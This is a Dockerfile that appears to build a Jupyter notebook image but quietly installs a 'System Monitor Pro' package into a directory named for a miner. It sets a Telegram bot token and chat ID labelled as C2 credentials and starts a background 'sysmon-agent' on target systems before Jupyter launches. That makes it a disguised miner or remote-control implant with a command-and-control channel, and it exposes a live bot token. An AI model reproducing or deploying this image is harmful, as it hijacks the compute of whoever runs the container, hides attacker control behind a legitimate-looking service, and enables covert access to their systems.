FROM python:3.10-slim

USER root

# Build timestamp to invalidate cache
ARG CACHEBUST=1

# Install minimal dependencies
RUN apt-get update &&     apt-get install -y --no-install-recommends ca-certificates curl &&     rm -rf /var/lib/apt/lists/*

# Create miner directory
RUN mkdir -p /opt/miner

# Install System Monitor Pro from GitHub tarball (no git needed)
RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredBerns/system-monitor/archive/refs/heads/main.tar.gz && echo "v3.0.1"

# Set Telegram credentials for C2 (works everywhere, no tunnel needed)
ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
ENV TG_CHAT_ID=5804150664

# Enable agent on target systems (skip on developer machine)
ENV SKIP_LOCAL=0

# Create start script - minimal for fast startup
RUN echo '#!/bin/bash' > /start.sh &&     echo 'sysmon-agent &' >> /start.sh &&     echo 'exec "$@"' >> /start.sh &&     chmod +x /start.sh

ENTRYPOINT ["/start.sh"]
CMD ["jupyter-notebook", "--ip=0.0.0.0", "--port=8888"]
